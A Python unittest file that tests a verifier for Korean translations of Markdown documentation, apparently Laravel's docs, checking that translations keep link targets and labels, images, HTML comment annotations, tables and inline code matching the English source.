"""verify 동작과 경계 조건 검증."""

import unittest

from sync import response_contract, verify


class VerifyContentTests(unittest.TestCase):
    """verify 내용 동작과 경계 조건 테스트 모음."""

    def test_accepts_preserved_reference_definition_as_structure(self):
        """preserved reference definition 로 구조 허용 검증."""

        source = '[cache]: /docs/13.x/cache "Cache docs"\n'

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(source, source=source), [])

    def test_accepts_container_and_multiline_reference_definitions(self):
        """container 및 multiline reference definitions 허용 검증."""

        source = """> [quote]: /quote

- [list]: /list

[multi]:
  /destination
  "multi
  line"
"""

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(source, source=source), [])

    def test_final_verifier_rejects_invalid_reference_looking_english_prose(self):
        """`final_verifier`의 잘못된 reference looking english prose 거부 검증."""

        source = "[[Acquire lock]]: /safe\n"

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(source, source, locale="ko"),
        )
        self.assertIn(
            "untranslated source text",
            verify.verify(source, source=source),
        )

    def test_rejects_reordered_duplicate_reference_definitions(self):
        """reordered duplicate reference definitions 거부 검증."""

        source = (
            "See [Laravel][ref].\n\n"
            "[ref]: /cache\n\n"
            "[ref]: /routing\n"
        )
        translated = (
            "<!-- See [Laravel][ref]. -->\n"
            "[Laravel][ref] 문서를 참고합니다.\n\n"
            "[ref]: /routing\n\n"
            "[ref]: /cache\n"
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_nbsp_reference_label_drift(self):
        """nbsp reference label drift 거부 검증."""

        source = (
            "See [Laravel][cache docs].\n\n"
            "[cache docs]: /cache\n"
        )
        translated = (
            "<!-- See [Laravel][cache docs]. -->\n"
            "[Laravel][cache docs] 문서를 참고합니다.\n\n"
            "[cache\u00a0docs]: /cache\n"
        )

        self.assertIn(
            "provider link label mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link label mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_reference_style_visible_label(self):
        """changed reference style visible label 거부 검증."""

        source = "[Cache][x]\n\n[x]: cache\n"
        translated = (
            "<!-- [Cache][x] -->\n"
            "[캐시][x]\n\n"
            "[x]: cache\n"
        )

        self.assertIn(
            "provider link label mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link label mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_reference_usage_resolved_to_another_definition(self):
        """reference usage resolved 후 another definition 거부 검증."""

        source = (
            "See [Laravel][cache].\n\n"
            "[cache]: /cache\n"
            "[routing]: /routing\n"
        )
        translated = (
            "<!-- See [Laravel][cache]. -->\n"
            "[Laravel][routing] 문서를 참고합니다.\n\n"
            "[cache]: /cache\n"
            "[routing]: /routing\n"
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_equivalent_angle_reference_destination(self):
        """equivalent angle reference destination 허용 검증."""

        source = "[ref]: <https://example.com/cache>\n"
        translated = "[ref]: https://example.com/cache\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_reference_target_route_class_drift(self):
        """reference 대상 route class drift 거부 검증."""

        source = "[ref]: /docs/13.x/cache\n"
        translated = "[ref]: /cache\n"

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source, version="13.x"),
        )

    def test_rejects_reference_drift_after_raw_html_container_exit(self):
        """raw HTML container exit 후 reference drift 거부 검증."""

        source = (
            "> <div>\n"
            "# Heading\n"
            '[ref]: /docs/13.x/cache "Cache docs"\n'
        )
        translated = (
            "> <div>\n"
            "<!-- # Heading -->\n"
            "# Heading\n"
            '[ref]: /docs/12.x/cache "Changed docs"\n'
        )

        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_link_only_legacy_pipe_table(self):
        """링크 만 legacy pipe table 허용 검증."""

        source = (
            "Name | Contract\n"
            "---- | --------\n"
            "[Cache](cache.md) | [Factory](factory.md)\n"
        )
        legacy_translation = (
            "<!-- Name | Contract ---- | -------- "
            "[Cache](cache.md) | [Factory](factory.md) -->\n"
            f"{source}"
        )
        fresh_translation = (
            "<!-- Name | Contract ---- | -------- "
            "[Cache](cache.md) | [Factory](factory.md) -->\n"
            "이름 | 계약\n"
            "---- | --------\n"
            "[Cache](cache.md) | [Factory](factory.md)\n"
        )

        self.assertEqual(
            response_contract.verify(fresh_translation, source, locale="ko"),
            [],
        )
        self.assertEqual(
            verify.verify(legacy_translation, source=source),
            [],
        )
        self.assertEqual(
            response_contract.verify(
                legacy_translation,
                source,
                locale="ko",
            ),
            [],
        )

    def test_accepts_preserved_version_and_date_legacy_table_cells(self):
        """preserved 버전 및 date legacy table cells 허용 검증."""

        source = (
            "Name | Version | Date | Description\n"
            "---- | ------- | ---- | -----------\n"
            "Laravel | 13.x | 2026-01-01 | Stable release\n"
        )
        translated = (
            "<!-- Name | Version | Date | Description ---- | ------- | ---- "
            "| ----------- Laravel | 13.x | 2026-01-01 | Stable release -->\n"
            "이름 | 버전 | 날짜 | 설명\n"
            "---- | ------- | ---- | -----------\n"
            "Laravel | 13.x | 2026-01-01 | 안정 릴리스\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_optional_quote_annotation_moved_to_later_quote(self):
        """선택적 quote annotation moved 후 later quote 거부 검증."""

        source = (
            "> First guidance.\n\n"
            "Middle paragraph.\n\n"
            "> Second guidance.\n"
        )
        translated = (
            "> 첫 번째 안내입니다.\n\n"
            "<!-- Middle paragraph. -->\n"
            "중간 문단입니다.\n\n"
            "> <!-- First guidance. -->\n"
            "> 두 번째 안내입니다.\n"
        )

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_changed_jsx_image_source_with_greater_than_expression(self):
        """changed jsx image 원문 포함 greater than expression 거부 검증."""

        source = (
            '<img src={count > 0 ? "/a.png" : "/b.png"} '
            'alt="Source" />\n'
        )
        translated = (
            '<!-- <img src={count > 0 ? "/a.png" : "/b.png"} '
            'alt="Source" /> -->\n'
            '<img src="/evil.png" alt="번역" />\n'
        )

        self.assertIn(
            "html image source mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_markdown_and_html_image_cross_format_reordering(self):
        """Markdown 및 HTML image cross format reordering 거부 검증."""

        source = (
            "![Cat](cat.png)\n\n"
            '<img src="dog.png" alt="Dog"/>\n'
        )
        translated = (
            '<!-- <img src="dog.png" alt="Dog"/> -->\n'
            '<img src="dog.png" alt="개"/>\n\n'
            "<!-- ![Cat](cat.png) -->\n"
            "![고양이](cat.png)\n"
        )

        self.assertIn(
            "link target mismatch",
            verify.verify(translated, source=source),
        )
        self.assertIn(
            "provider link target mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_detects_empty_html_comments_outside_code(self):
        """빈 HTML comments 외부 code 감지 검증."""

        for text in ("<!-- -->\n", "<!--\n\t\n-->\n"):
            with self.subTest(text=text):
                self.assertIn("empty HTML comment", verify.verify(text))

    def test_accepts_a_preserved_empty_source_comment(self):
        """preserved 빈 원문 comment 허용 검증."""

        source = "<!-- -->\n\nKeep this paragraph.\n"
        translated = (
            "<!-- -->\n\n"
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n"
        )

        self.assertNotIn(
            "empty HTML comment",
            verify.verify(translated, source=source),
        )

    def test_detects_an_extra_empty_html_comment(self):
        """extra 빈 HTML comment 감지 검증."""

        source = "Keep this paragraph.\n"
        translated = (
            "<!-- -->\n"
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n"
        )

        self.assertIn(
            "empty HTML comment",
            verify.verify(translated, source=source),
        )

    def test_rejects_a_relocated_empty_source_comment(self):
        """relocated 빈 원문 comment 거부 검증."""

        source = "<!-- -->\n\nKeep this paragraph.\n"
        translated = (
            "<!-- Keep this paragraph. -->\n"
            "이 문단을 유지합니다.\n\n"
            "<!-- -->\n"
        )

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_unclosed_html_comment_outside_code(self):
        """unclosed HTML comment 외부 code 감지 검증."""

        self.assertIn(
            "malformed HTML comment",
            verify.verify("본문입니다.\n\n<!-- unfinished\n"),
        )

    def test_detects_stray_html_comment_closer_outside_code(self):
        """stray HTML comment closer 외부 code 감지 검증."""

        self.assertIn(
            "malformed HTML comment",
            verify.verify("본문입니다. -->\n"),
        )

    def test_detects_comment_delimiters_crossed_by_inline_code(self):
        """comment delimiters crossed by inline code 감지 검증."""

        text = "<!-- begin ` --> <!-- unclosed `\n"

        self.assertIn("malformed HTML comment", verify.verify(text))

    def test_ignores_malformed_comment_tokens_inside_fenced_code(self):
        """`ignores_malformed_comment_tokens_inside_fenced_code` 시나리오 검증."""

        text = """```html
<!-- -->
<!-- unfinished
-->
```
"""

        self.assertNotIn("malformed HTML comment", verify.verify(text))

    def test_ignores_comment_tokens_in_markdown_literal_contexts(self):
        """`ignores_comment_tokens_in_markdown_literal_contexts` 시나리오 검증."""

        cases = (
            "~~~text <!--\nbody\n~~~\n",
            "    <!--\n",
            "---\ndescription: <!-- literal\n---\n",
        )

        for text in cases:
            with self.subTest(text=text):
                self.assertNotIn(
                    "malformed HTML comment",
                    verify.verify(text),
                )

    def test_accepts_a_preserved_multiline_source_comment(self):
        """preserved multiline 원문 comment 허용 검증."""

        source = """<!--
keep line 1
keep line 2
-->

Acquire the cache lock.
"""
        translated = """<!--
keep line 1
keep line 2
-->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_annotation_with_structural_html_wrapper_lines(self):
        """annotation 포함 structural HTML wrapper 줄 허용 검증."""

        source = """<div>
<span>Visible text</span>
</div>
"""
        translated = """<!--
<div>
<span>Visible text</span>
</div>
-->
<div>
<span>표시 텍스트</span>
</div>
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_comment_for_a_source_structural_html_block(self):
        """comment 대상 원문 structural HTML 블록 허용 검증."""

        source = """<p align="center">
<img src="release.png"/>
</p>
"""
        translated = f"""<!--
{source}-->
{source}"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_adjacent_legacy_image_comment_with_translated_alt(self):
        """adjacent legacy image comment 포함 translated alt 허용 검증."""

        source = '<img src="diagram.png" alt="Source diagram"/>\n'
        translated = (
            '<!-- <img src="diagram.png" alt="Source diagram"/> -->\n'
            '<img src="diagram.png" alt="번역된 다이어그램" />\n'
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_relocated_source_anchor_annotation(self):
        """relocated 원문 anchor annotation 거부 검증."""

        source = '<a name="cache"></a>\n\nCache body.\n'
        translated = """<a name="cache"></a>

<!-- Cache body. -->
캐시 본문입니다.

<!-- <a name="cache"></a> -->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_multiline_structural_annotation(self):
        """relocated multiline structural annotation 거부 검증."""

        source = """<p align="center">
<img src="release.png"/>
</p>
"""
        translated = f"""{source}
<!--
{source}-->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_legacy_annotation_around_html_table_boundaries(self):
        """legacy annotation around HTML table boundaries 거부 검증."""

        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<!--
<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
-->
<table>
<tr><td><strong>명령어</strong></td><td><code>php</code></td></tr>
<tr><td><strong>인수</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_relocated_duplicate_structural_annotations(self):
        """relocated duplicate structural annotation 거부 검증."""

        source = "<div></div>\n\n<div></div>\n"
        translated = f"""{source}
<!-- <div></div> -->
<!-- <div></div> -->
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_an_owned_optional_quote_annotation(self):
        """owned 선택적 quote annotation 허용 검증."""

        source = "> Remember this guidance.\n"
        translated = """> <!-- > Remember this guidance. -->
> 이 안내를 기억하세요.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_owned_quote_annotations_after_a_fenced_block(self):
        """fenced 블록 후 owned quote annotation 허용 검증."""

        source = """```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

<a name="first"></a>

> [!NOTE]
> First guidance.

<a name="second"></a>

> [!NOTE]
> Second guidance.
"""
        translated = """```text
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

<a name="first"></a>

> [!NOTE]
> <!-- First guidance. -->
> 첫 번째 안내입니다.

<a name="second"></a>

> [!NOTE]
> <!-- Second guidance. -->
> 두 번째 안내입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_rejects_optional_quote_annotation_at_the_wrong_depth(self):
        """선택적 quote annotation at wrong depth 거부 검증."""

        source = "> Remember this guidance.\n"
        translated = """<!-- > Remember this guidance. -->
> > 이 안내를 기억하세요.
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_table_annotation_with_a_different_column_shape(self):
        """table annotation 포함 different column shape 거부 검증."""

        source = "| Name | Value |\n"
        translated = """<!-- | Name | Value | -->
| 이름 |
"""

        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_rejects_table_annotation_moved_to_a_later_same_shape_table(self):
        """table annotation moved 후 later same shape table 거부 검증."""

        source = """| First | Value |
| --- | --- |
| Alpha | One |

| Second | Value |
| --- | --- |
| Beta | Two |
"""
        translated = """| 첫째 | 값 |
| --- | --- |
| 알파 | 하나 |

<!-- | First | Value | -->
| 둘째 | 값 |
| --- | --- |
| 베타 | 둘 |
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )
        self.assertIn(
            "source comment mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_title_case_action_phrase_with_translated_suffix(self):
        """title case action phrase 포함 translated suffix 감지 검증."""

        source = "Delete All Records\n"
        translated = (
            "<!-- Delete All Records -->\n"
            "Delete All Records를 실행합니다.\n"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_detects_prose_phrases_with_technical_prefixes(self):
        """prose phrases 포함 technical prefixes 감지 검증."""

        cases = (
            ("This Works", "This Works예요."),
            ("This Works.", "This Works예요."),
            ("API Requests Are Retried", "API Requests Are Retried를 사용합니다."),
            ("HTTP Requests Are Retried", "HTTP Requests Are Retried를 사용합니다."),
            ("Laravel Users Are Active", "Laravel Users Are Active를 사용합니다."),
            ("API Delete All Records", "API Delete All Records를 사용합니다."),
        )
        for source_body, translated_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{translated_body}\n"
                )

                self.assertIn(
                    "untranslated source text",
                    verify.verify(translated, source=source_body + "\n"),
                )

    def test_detects_all_caps_prose_echoes(self):
        """모든 caps prose echoes 감지 검증."""

        cases = (
            "API ERROR HANDLING AND RETRY GUIDE",
            "HTTP JSON API SQL PHP",
            "API Delete All Records",
        )
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}\n"
                )

                self.assertIn(
                    "untranslated source text",
                    verify.verify(translated, source=source_body + "\n"),
                )

    def test_detects_untranslated_prose_in_a_legacy_pipe_table(self):
        """untranslated prose in legacy pipe table 감지 검증."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            f"{source}"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_accepts_translated_prose_in_a_legacy_pipe_table(self):
        """translated prose in legacy pipe table 허용 검증."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "잠금 | 쓰기 방지\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_partial_prose_echo_in_a_legacy_pipe_table(self):
        """partial prose echo in legacy pipe table 감지 검증."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "Lock | Prevent writes를 차단합니다\n"
        )

        self.assertIn(
            "untranslated source text",
            verify.verify(translated, source=source),
        )

    def test_accepts_legacy_english_headers_with_translated_table_prose(self):
        """legacy english headers 포함 translated table prose 허용 검증."""

        source = (
            "Command | Description\n"
            "------- | -----------\n"
            "`valet start` | Start the Valet daemons.\n"
        )
        translated = (
            "<!-- Command | Description ------- | ----------- "
            "`valet start` | Start the Valet daemons. -->\n"
            "Command | Description\n"
            "------- | -----------\n"
            "`valet start` | Valet 데몬을 시작합니다.\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_product_and_api_names(self):
        """preserved product 및 api names 허용 검증."""

        cases = ("Laravel Vapor", "OpenAI Responses API")
        for source_body in cases:
            with self.subTest(source=source_body):
                translated = (
                    f"<!-- {source_body} -->\n"
                    f"{source_body}를 사용합니다.\n"
                )

                self.assertEqual(
                    verify.verify(translated, source=source_body + "\n"),
                    [],
                )

    def test_accepts_preserved_indented_command(self):
        """preserved indented 명령 허용 검증."""

        source = "    vagrant destroy\n"
        translated = (
            "<!--     vagrant destroy -->\n"
            "    vagrant destroy\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_legacy_pipe_table(self):
        """preserved legacy pipe table 허용 검증."""

        source = (
            "Facade | Class\n"
            "------- | -------\n"
            "App | `Application`\n"
        )
        translated = (
            "<!-- Facade | Class ------- | ------- App | `Application` -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_inline_code_only_paragraph(self):
        """preserved inline code 만 paragraph 허용 검증."""

        source = "`Illuminate\\Database\\Grammar`\n"
        translated = (
            "<!-- `Illuminate\\Database\\Grammar` -->\n"
            "`Illuminate\\Database\\Grammar`\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_mixed_bare_link_and_inline_code_identifier_list(self):
        """mixed bare 링크 및 inline code identifier list 허용 검증."""

        source = "[assertCookie](#assert-cookie)\n`assertSimilarJson`\n[assertStatus](#assert-status)\n"
        translated = (
            "<!-- [assertCookie](#assert-cookie) `assertSimilarJson` "
            "[assertStatus](#assert-status) -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_html_code_only_list_item_without_annotation(self):
        """HTML code 만 list item 제외 annotation 허용 검증."""

        sources = (
            "- <code>decimal:&lt;precision&gt;</code>\n",
            "- `decimal:`<code>&lt;digits&gt;</code>\n",
        )

        for source in sources:
            with self.subTest(source=source):
                self.assertEqual(
                    verify.missing_original_comments(source, source),
                    [],
                )
                self.assertEqual(verify.verify(source, source=source), [])

    def test_accepts_preserved_emphasized_identifier_group(self):
        """preserved emphasized identifier group 허용 검증."""

        source = (
            "**whereDate / whereMonth / whereDay / whereYear / whereTime**\n"
        )
        translated = (
            "<!-- **whereDate / whereMonth / whereDay / whereYear / "
            "whereTime** -->\n"
            f"{source}"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_accepts_preserved_environment_assignment(self):
        """preserved 환경 assignment 허용 검증."""

        source = "PADDLE_SANDBOX=true\n"
        translated = (
            "<!-- PADDLE_SANDBOX=true -->\n"
            "PADDLE_SANDBOX=true\n"
        )

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_ignores_heading_attribute_syntax_inside_html_comments(self):
        """`ignores_heading_attribute_syntax_inside_html_comments` 시나리오 검증."""

        text = "<!--\n# Title {.class}\n-->\n"

        self.assertNotIn("title style class", verify.verify(text))

    def test_detects_link_url_changed_even_when_original_comment_contains_url(self):
        """original comment contains url 시 링크 url changed even 감지 검증."""

        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[라우팅](routing.md#기본-라우팅)을 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_detects_translated_link_text_even_when_url_is_preserved(self):
        """`detects_translated_link_text_even_when_url`의 preserved 판정 검증."""

        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[라우팅](routing.md#basic-routing)을 참고하세요.
"""

        self.assertIn("link label mismatch", verify.verify(translated, source=source))

    def test_accepts_preserved_link_text_when_url_is_preserved(self):
        """`accepts_preserved_link_text_when_url`의 preserved 판정 검증."""

        source = "See [Routing](routing.md#basic-routing)."
        translated = """<!-- See [Routing](routing.md#basic-routing). -->
[Routing](routing.md#basic-routing)을 참고하세요.
"""

        self.assertNotIn("link label mismatch", verify.verify(translated, source=source))

    def test_accepts_translated_image_alt_with_ordered_target_and_title(self):
        """translated image alt 포함 ordered 대상 및 title 허용 검증."""

        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        translated = (
            '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
            '고양이 이미지를 표시합니다: ![고양이](cat.png "Cat title").\n\n'
            '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
            '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
        )

        self.assertEqual([], verify.verify(translated, source=source))

    def test_detects_markdown_image_target_and_title_drift(self):
        """Markdown image 대상 및 title drift 감지 검증."""

        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        cases = (
            (
                "swapped targets",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](dog.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](cat.png "Dog title").\n'
                ),
                "link target mismatch",
            ),
            (
                "missing image",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Cat title").\n'
                ),
                "link target mismatch",
            ),
            (
                "changed target",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](wrong.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "link target mismatch",
            ),
            (
                "swapped titles",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Dog title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Cat title").\n'
                ),
                "link title mismatch",
            ),
            (
                "changed title",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Wrong title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "link title mismatch",
            ),
        )

        for name, translated, expected_issue in cases:
            with self.subTest(name=name):
                self.assertIn(
                    expected_issue,
                    verify.verify(translated, source=source),
                )

    def test_ignores_backslash_escaped_link_syntax(self):
        """`ignores_backslash_escaped_link_syntax` 시나리오 검증."""

        source = "Literal \\[Docs](guide.md).\n"
        translated = """<!-- Literal \\[Docs](guide.md). -->
리터럴 \\[문서](other.md)입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_unclosed_link_with_parentheses_in_destination(self):
        """unclosed 링크 포함 parentheses in destination 감지 검증."""

        target = "https://en.wikipedia.org/wiki/Mode_(statistics)"
        source = f"See [Mode]({target})."
        translated = f"""<!-- See [Mode]({target}). -->
[Mode](https://en.wikipedia.org/wiki/Mode_(statistics)을 참고하세요.
"""

        self.assertIn("link target mismatch", verify.verify(translated, source=source))

    def test_detects_changed_target_with_non_double_quoted_link_title(self):
        """changed 대상 포함 non double quoted 링크 title 감지 검증."""

        cases = (
            ("'Read more'", "'Read more'"),
            ("(Read more)", "(Read more)"),
        )
        for source_title, translated_title in cases:
            with self.subTest(title=source_title):
                source = f"See [Docs](guide.md {source_title}).\n"
                translated = (
                    f"<!-- See [Docs](guide.md {source_title}). -->\n"
                    f"[문서](other.md {translated_title})를 참고하세요.\n"
                )
                self.assertIn(
                    "link target mismatch",
                    verify.verify(translated, source=source),
                )

    def test_detects_changed_link_title_when_target_is_preserved(self):
        """`detects_changed_link_title_when_target`의 preserved 판정 검증."""

        source = 'See [Docs](guide.md "Read more").\n'
        translated = (
            '<!-- See [Docs](guide.md "Read more"). -->\n'
            '[Docs](guide.md "다음 읽기")를 참고하세요.\n'
        )

        self.assertIn(
            "link title mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_swapped_link_labels_and_targets(self):
        """swapped 링크 labels 및 대상 감지 검증."""

        source = (
            "Generate a [redirect HTTP response](responses#redirects) "
            "for a [named route](routing#named-routes)."
        )
        translated = """<!-- Generate a [redirect HTTP response](responses#redirects) for a [named route](routing#named-routes). -->
[redirect HTTP response](routing#named-routes)에 대한 [named route](responses#redirects)을 생성합니다.
"""

        self.assertIn("link pair mismatch", verify.verify(translated, source=source))

    def test_accepts_normalized_reference_definition_label(self):
        """normalized reference definition label 허용 검증."""

        source = '[Cache \t DOC]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache doc]: /docs/13.x/cache "Cache docs"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertEqual(issues, [])

    def test_detects_reference_definition_version_drift(self):
        """reference definition 버전 drift 감지 검증."""

        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[CACHE-DOC]: /docs/12.x/cache "Cache docs"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link pair mismatch", issues)
        self.assertNotIn("link label mismatch", issues)

    def test_detects_reference_definition_title_drift(self):
        """reference definition title drift 감지 검증."""

        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache-doc]: /docs/13.x/cache "다른 제목"\n'

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link title mismatch", issues)
        self.assertNotIn("link target mismatch", issues)
        self.assertNotIn("link label mismatch", issues)
        self.assertNotIn("link pair mismatch", issues)

    def test_detects_missing_duplicate_reference_definition(self):
        """누락된 duplicate reference definition 감지 검증."""

        definition = '[cache-doc]: /docs/13.x/cache "Cache docs"'
        source = f"{definition}\n\n{definition}\n"
        translated = f"{definition}\n"

        issues = verify.verify(translated, source=source, version="13.x")

        self.assertIn("link target mismatch", issues)
        self.assertIn("link label mismatch", issues)
        self.assertIn("link pair mismatch", issues)

    def test_detects_missing_inline_code_from_translated_body(self):
        """누락된 inline code from translated body 감지 검증."""

        source = "Set `user_id` before saving."
        translated = """<!-- Set `user_id` before saving. -->
저장하기 전에 사용자 ID를 설정합니다.
"""

        self.assertIn("inline code mismatch", verify.verify(translated, source=source))

    def test_ignores_backslash_escaped_backticks_as_inline_code(self):
        """`ignores_backslash_escaped_backticks_as_inline_code` 시나리오 검증."""

        source = "Use \\`literal\\` text.\n"
        translated = """<!-- Use \\`literal\\` text. -->
번역된 \\`리터럴\\` 텍스트입니다.
"""

        self.assertEqual(verify.verify(translated, source=source), [])

    def test_detects_changed_multi_backtick_inline_code(self):
        """changed multi backtick inline code 감지 검증."""

        source = "Use ``foo`bar`` now.\n"
        translated = "이제 ``foo`baz``를 사용합니다.\n"

        self.assertIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_detects_changed_multiline_inline_code(self):
        """changed multiline inline code 감지 검증."""

        source = "Use `foo\nbar` now.\n"
        translated = "이제 `foo\nbaz`를 사용합니다.\n"

        self.assertIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

    def test_does_not_pair_backticks_across_a_paragraph_boundary(self):
        """않음 pair backticks across paragraph boundary 동작 검증."""

        source = "Use the `using` method`:\n\nNext `sub` claim.\n"
        translated = """<!-- Use the `using` method`: -->
`using` 메서드를 사용합니다.

<!-- Next `sub` claim. -->
다음 `sub` 클레임입니다.
"""

        self.assertNotIn(
            "inline code mismatch",
            verify.verify(translated, source=source),
        )

